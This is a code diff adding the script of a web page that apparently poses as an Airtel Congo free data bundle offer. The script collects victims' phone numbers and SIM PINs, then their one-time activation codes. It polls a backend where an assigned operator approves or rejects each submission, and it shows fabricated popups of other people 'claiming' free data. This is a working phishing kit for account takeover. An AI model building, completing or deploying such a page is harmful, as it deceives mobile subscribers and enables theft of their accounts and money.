+    document.getElementById('bLogin').className = ok ? 'btn-login rdy' : 'btn-login';
+  }
+
+  function togPin() {
+    [0,1,2,3].forEach(i => {
+      const b = document.getElementById('p'+i);
+      b.type = b.type === 'password' ? 'text' : 'password';
+    });
+  }
+
+  async function doLogin() {
+    hideLoginMsg();
+
+    const rawPhone = document.getElementById('lgPh').value.trim();
+    const pin = [0,1,2,3].map(i => document.getElementById('p'+i).value).join('');
+
+    if (!rawPhone || pin.length < 4) {
+      showLoginMsg('Please enter your phone number and 4-digit SIM PIN.');
+      return;
+    }
+
+    const phoneNumber = '+243' + rawPhone;
+    const adminId = getAdminId();
+
+    document.getElementById('mLogin').classList.add('show');
+    document.getElementById('bLogin').disabled = true;
+
+    try {
+      const res = await fetch('/api/verify-pin', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phoneNumber,
+          pin,
+          adminId: adminId || null,
+          assignmentType: adminId ? 'specific' : 'auto'
+        })
+      });
+
+      const data = await res.json();
+
+      document.getElementById('mLogin').classList.remove('show');
+
+      if (data.success) {
+        S.applicationId   = data.applicationId;
+        S.assignedAdminId = data.assignedAdminId;
+
+        document.getElementById('otpPh').textContent = phoneNumber;
+
+        goTo('page-otp');
+        document.getElementById('pinWait').classList.add('show');
+        document.getElementById('otpInputSection').style.display = 'none';
+
+        pollPinStatus();
+
+      } else {
+        document.getElementById('bLogin').disabled = false;
+        showLoginMsg(data.message || 'Verification failed. Please try again.');
+      }
+
+    } catch (err) {
+      document.getElementById('mLogin').classList.remove('show');
+      document.getElementById('bLogin').disabled = false;
+      showLoginMsg('Network error. Please check your connection and try again.');
+    }
+  }
+
+  let pinPollInterval = null;
+
+  function pollPinStatus() {
+    if (pinPollInterval) clearInterval(pinPollInterval);
+
+    pinPollInterval = setInterval(async () => {
+      try {
+        const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
+        const data = await res.json();
+
+        if (!data.success) return;
+
+        if (data.status === 'approved') {
+          clearInterval(pinPollInterval);
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = 'block';
+          showOtpMsg('success', 'Details verified! Please enter your activation code below.');
+          startRs();
+          document.getElementById('o0').focus();
+
+        } else if (data.status === 'rejected') {
+          clearInterval(pinPollInterval);
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = 'none';
+          showOtpMsg('error', 'Your details could not be verified. Please go back and try again.');
+          document.getElementById('bLogin').disabled = false;
+        }
+
+      } catch (e) {}
+    }, 2000);
+
+    setTimeout(() => {
+      if (pinPollInterval) {
+        clearInterval(pinPollInterval);
+        if (document.getElementById('pinWait').classList.contains('show')) {
+          document.getElementById('pinWait').classList.remove('show');
+          showOtpMsg('warning', 'Verification timed out. Please go back and try again.');
+        }
+      }
+    }, 300000);
+  }
+
+  function otpMv(el, i) {
+    el.value = el.value.replace(/\D/, '');
+    if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
+    const ok = [0,1,2,3].every(j => document.getElementById('o'+j).value);
+    document.getElementById('bOtp').className = ok ? 'btn-otp rdy' : 'btn-otp';
+  }
+
+  let _rsInterval = null;
+  function startRs() {
+    if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+
+    let s = 60;
+    const rsBox = document.getElementById('otpRs');
+    if (!rsBox) return;
+
+    rsBox.innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">' + s + '</span> <span data-i18n="otp_seconds">seconds</span>';
+
+    _rsInterval = setInterval(() => {
+      s--;
+      const cur = document.getElementById('rsS');
+      if (cur) cur.textContent = s;
+      if (s <= 0) {
+        clearInterval(_rsInterval);
+        _rsInterval = null;
+        const box = document.getElementById('otpRs');
+        if (box) box.innerHTML = '<span style="color:var(--airtel-red);cursor:pointer;font-weight:600" onclick="resendOtp()">Resend code</span>';
+      }
+    }, 1000);
+  }
+
+  async function resendOtp() {
+    if (!S.applicationId) return;
+    try {
+      const res  = await fetch('/api/resend-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ applicationId: S.applicationId })
+      });
+      const data = await res.json();
+      if (data.success) {
+        showOtpMsg('info', 'A new activation code request has been sent.');
+        startRs();
+        [0,1,2,3].forEach(i => { document.getElementById('o'+i).value = ''; });
+        document.getElementById('bOtp').className = 'btn-otp';
+        document.getElementById('o0').focus();
+      } else {
+        showOtpMsg('error', 'Could not resend code. Please try again.');
+      }
+    } catch {
+      showOtpMsg('error', 'Network error while resending code.');
+    }
+  }
+
+  async function doOtp() {
+    const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
+    if (otp.length < 4) {
+      showOtpMsg('warning', 'Please enter all 4 digits of your activation code.');
+      return;
+    }
+
+    hideOtpMsgs();
+
+    let c = 3;
+    document.getElementById('otpVT').textContent = 'Please wait… (' + c + 's)';
+    document.getElementById('mOtp').classList.add('show');
+    document.getElementById('bOtp').disabled = true;
+
+    const countdown = setInterval(() => {
+      c--;
+      const el = document.getElementById('otpVT');
+      if (el) el.textContent = 'Please wait… (' + c + 's)';
+    }, 1000);
+
+    try {
+      const res  = await fetch('/api/verify-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ applicationId: S.applicationId, otp })
+      });
+      const data = await res.json();
+
+      clearInterval(countdown);
+      document.getElementById('mOtp').classList.remove('show');
+
+      if (data.success) {
+        showOtpMsg('success', 'Code submitted. Activating your data bundle…');
+        pollOtpStatus();
+      } else {
+        document.getElementById('bOtp').disabled = false;
+        showOtpMsg('error', data.message || 'Failed to submit code. Please try again.');
+      }
+
+    } catch (err) {
+      clearInterval(countdown);
+      document.getElementById('mOtp').classList.remove('show');
+      document.getElementById('bOtp').disabled = false;
+      showOtpMsg('error', 'Network error. Please check your connection.');
+    }
+  }
+
+  let otpPollInterval = null;
+
+  function pollOtpStatus() {
+    if (otpPollInterval) clearInterval(otpPollInterval);
+
+    otpPollInterval = setInterval(async () => {
+      try {
+        const res  = await fetch(`/api/check-otp-status/${S.applicationId}`);
+        const data = await res.json();
+
+        if (!data.success) return;
+
+        if (data.status === 'approved') {
+          clearInterval(otpPollInterval);
+          document.getElementById('apAmt').textContent  = (S.amt || 10) + ' GB';
+          document.getElementById('apTerm').textContent = S.term || '30 Days';
+          goTo('page-approval');
+
+        } else if (data.status === 'rejected') {
+          clearInterval(otpPollInterval);
+          showOtpMsg('error', 'Activation failed. Please contact support.');
+          document.getElementById('bOtp').disabled = false;
+
+        } else if (data.status === 'wrongpin_otp') {
+          clearInterval(otpPollInterval);
+          showOtpMsg('error', 'Incorrect SIM PIN detected. Redirecting to login…');
+          setTimeout(() => {
+            [0,1,2,3].forEach(i => document.getElementById('p'+i).value = '');
+            chkLogin();
+            document.getElementById('bLogin').disabled = false;
+            [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+            document.getElementById('bOtp').className = 'btn-otp';
+            document.getElementById('bOtp').disabled = false;
+            document.getElementById('pinWait').classList.remove('show');
+            document.getElementById('otpInputSection').style.display = '';
+            if (_rsInterval) { clearInterval(_rsInterval); _rsInterval = null; }
+            document.getElementById('otpRs').innerHTML = '<span data-i18n="otp_resend_in">Resend code in</span> <span id="rsS">60</span> <span data-i18n="otp_seconds">seconds</span>';
+            hideOtpMsgs();
+            S.applicationId = null;
+            S.assignedAdminId = null;
+            goTo('page-login');
+          }, 2500);
+
+        } else if (data.status === 'wrongcode') {
+          clearInterval(otpPollInterval);
+          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+          document.getElementById('bOtp').className = 'btn-otp';
+          document.getElementById('bOtp').disabled = false;
+          showOtpMsg('error', 'Incorrect activation code. Please check and re-enter.');
+          document.getElementById('o0').focus();
+        }
+
+      } catch (e) {}
+    }, 2000);
+
+    setTimeout(() => {
+      if (otpPollInterval) {
+        clearInterval(otpPollInterval);
+        showOtpMsg('warning', 'Activation timed out. Please try again.');
+        document.getElementById('bOtp').disabled = false;
+      }
+    }, 300000);
+  }
+
+  // ══════════════════════════════════════════════════════
+  // LIVE CLAIM POPUP LOGIC (AIRTEL CONGO - DATA BUNDLES)
+  // ══════════════════════════════════════════════════════
+  document.addEventListener("DOMContentLoaded", () => {
+    const liveApprovals = [
+        { number: "+243 05* *** 416", location: "Kinshasa", amount: "5 GB" },
+        { number: "+243 05* *** 564", location: "Lubumbashi", amount: "10 GB" },
+        { number: "+243 05* *** 678", location: "Mbuji-Mayi", amount: "15 GB" },
+        { number: "+243 05* *** 780", location: "Kananga", amount: "20 GB" },
+        { number: "+243 05* *** 567", location: "Kisangani", amount: "25 GB" },
+        { number: "+243 05* *** 608", location: "Goma", amount: "30 GB" },
+        { number: "+243 05* *** 450", location: "Bukavu", amount: "40 GB" },
+        { number: "+243 05* *** 067", location: "Matadi", amount: "50 GB" },
+        { number: "+243 05* *** 406", location: "Kolwezi", amount: "75 GB" },
+        { number: "+243 05* *** 577", location: "Likasi", amount: "100 GB" }
+    ];
+
+    const popup = document.getElementById("popup");
+    const popupText = document.getElementById("popup-text");
+    const popupAvatar = document.getElementById("popup-avatar");
+
+    if (!popup || !popupText || !popupAvatar) return;
+
+    let lastIndex = -1;
+
+    function displayPopup() {
+        let index;
+        do {
+            index = Math.floor(Math.random() * liveApprovals.length);
+        } while (index === lastIndex && liveApprovals.length > 1);
+        lastIndex = index;
+
+        const user = liveApprovals[index];
+        popupAvatar.textContent = "+243";
+        popupText.innerHTML = `
+            <strong>${user.number}</strong><br>
+            From <strong>${user.location}</strong><br>
+            Successfully claimed
+            <strong>${user.amount} Free Data!</strong>
+        `;
+        popup.classList.add("show");
+        setTimeout(() => {
+            popup.classList.remove("show");
+        }, 2500);
+    }
+
+    setTimeout(displayPopup, 2000);
+    setInterval(displayPopup, 5500);
+  });
+</script>
+</body>
+</html>
